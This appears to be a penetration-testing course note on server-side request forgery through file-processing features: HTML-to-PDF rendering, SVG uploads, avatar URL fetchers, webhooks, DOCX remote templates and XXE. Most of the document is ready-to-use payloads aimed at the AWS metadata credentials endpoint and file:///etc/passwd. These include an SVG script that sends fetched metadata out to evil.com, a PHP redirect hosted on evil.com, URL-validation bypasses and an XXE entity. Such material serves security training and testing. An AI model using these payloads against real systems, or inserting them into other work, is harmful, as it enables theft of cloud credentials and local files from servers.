---
tags: [vapt, ssrf, intermediate]
difficulty: intermediate
module: "13 - SSRF"
topic: "13.05 SSRF via File Imports (PDF, webhooks, image fetchers)"
---

# 13.05 — SSRF via File Imports

## File Processing as SSRF Vector

```
MANY FEATURES PROCESS FILES THAT CONTAIN URLs:
  PDF generation → fetches external resources (images, CSS)
  DOCX/XLSX → may have remote images or OLE objects
  SVG upload → can contain href to external URLs
  HTML to PDF → fetches everything in the HTML
  Image fetcher → downloads avatar from URL
  Webhooks → server makes HTTP request to webhook URL
  RSS feeds → fetches remote feed URL
  
  If any of these can be pointed at internal URLs → SSRF!
```

---

## SSRF via PDF Generation (wkhtmltopdf)

```
wkhtmltopdf RENDERS HTML INCLUDING:
  ✓ <img src="http://...">
  ✓ <link href="http://...">
  ✓ CSS background-image: url("http://...")
  ✓ <iframe src="http://...">
  ✓ JavaScript fetch() (if JS enabled)

ATTACK — INJECT INTO HTML CONVERTED TO PDF:
  If app converts user-provided HTML → PDF:
  
  <img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
  
  wkhtmltopdf fetches this URL!
  The AWS credentials appear as text in the generated PDF!
  
ATTACK — SSRF THROUGH PDF TEMPLATE:
  If user controls content of PDF:
  <script>
    var x = new XMLHttpRequest();
    x.open('GET', 'http://169.254.169.254/latest/meta-data/', false);
    x.send();
    document.write(x.responseText);
  </script>
  
  → Credentials written into PDF body!
  
FILE:// PROTOCOL FOR LOCAL FILES:
  <img src="file:///etc/passwd">
  <iframe src="file:///etc/passwd">
  → File contents embedded in PDF!
```

---

## SSRF via SVG Upload

```
SVG IS XML AND CAN CONTAIN EXTERNAL REFERENCES:

BASIC SVG SSRF:
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/" />
</svg>

SVG WITH JavaScript (if rendered in browser):
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch('http://169.254.169.254/latest/meta-data/')
      .then(r=>r.text())
      .then(d=>fetch('https://evil.com/steal?d='+btoa(d)));
  </script>
</svg>

TESTING:
  1. Upload SVG file to "avatar" or "attachment" upload
  2. Check if server-side rendering occurs (thumbnails, PDF embed)
  3. If yes → SSRF via SVG!
```

---

## SSRF via Avatar/Image URL Fetch

```
COMMON FEATURE: "Set avatar from URL"
  User provides: https://gravatar.com/avatar/xxx
  App fetches the image server-side → stores locally
  
ATTACK:
  Provide: http://169.254.169.254/latest/meta-data/iam/security-credentials/
  
  App attempts to fetch "image" from metadata endpoint!
  Response (JSON with credentials) → may cause image decode error
  
  BUT: Error message might contain the credential data!
  OR: Use Burp Collaborator → confirm blind SSRF
  OR: Response time differs → internal IP reached

BETTER APPROACH (data exfil):
  Host PHP server on evil.com:
  <?php
    header("Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name");
  ?>
  
  Provide URL: http://evil.com/redirect.php
  App fetches → follows redirect to metadata endpoint!
  If app stores response → credentials leaked!
```

---

## SSRF via Webhook Functionality

```
WEBHOOKS ARE PRIME SSRF TARGETS:
  Many apps allow users to configure webhook URLs.
  App sends HTTP POST to that URL on various events.
  
  ATTACK:
  Configure webhook URL as: http://169.254.169.254/latest/meta-data/
  Trigger the event that sends the webhook.
  
  App sends POST request to metadata endpoint!
  Response is stored in webhook delivery log?
  
TESTING:
  1. Find webhook configuration (common in: CI/CD, payment processors,
     communication tools, monitoring platforms)
  2. Set webhook URL to: https://YOUR_BURP_COLLABORATOR.burpcollaborator.net
  3. Confirm blind SSRF
  4. Change to: http://169.254.169.254/latest/meta-data/
  5. Check webhook delivery log for response content
  
WEBHOOK SSRF BYPASS:
  If URL is validated, try:
  http://evil.com/redirect → redirects to 169.254.169.254
  http://169.254.169.254@ (auth bypass)
  Use DNS rebinding (note 15)
```

---

## SSRF via DOCX/XLSX Remote Templates

```
Microsoft Office files can reference remote resources:

DOCX WITH REMOTE IMAGE:
  <!-- In document.xml or docProps/ -->
  <wp:inline>
    <a:blip r:embed="rId1" cacheKey="..."/>
  </wp:inline>
  
  <!-- In _rels/document.xml.rels: -->
  <Relationship Id="rId1" Type="...image..." Target="http://169.254.169.254/" TargetMode="External"/>

AUTOMATED TOOL: Office SSRF Payload Generator:
  # Create DOCX with remote template reference
  python3 docx_ssrf.py --ip 169.254.169.254 --out payload.docx

WHEN IT WORKS:
  App parses Office files on upload
  App converts DOCX to PDF server-side
  App extracts images from uploaded files
  App validates document content server-side
```

---

## SSRF via XML External Entity (XXE → SSRF)

```
XXE CAN BE USED FOR SSRF:
  <!DOCTYPE root [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
  ]>
  <root>&xxe;</root>
  
  If app parses XML → XXE → SSRF → data in XML response!
  
  (Covered in detail in Module 14 XXE)
  
CHAIN: XXE → SSRF → AWS Credentials
  1. Upload XML with XXE payload pointing to metadata endpoint
  2. XXE processes → server fetches credentials
  3. XXE includes content in XML response (or error)
  4. Attacker reads credentials!
```

---

## Related Notes
- [[01 - What is SSRF]] — fundamentals
- [[07 - Blind SSRF]] — detecting via Burp Collaborator
- [[09 - SSRF Cloud Metadata AWS]] — cloud credential theft
- [[Module 14 - XXE]] — XXE to SSRF chain
- [[Module 10 - PDF Injection]] — PDF-based SSRF details
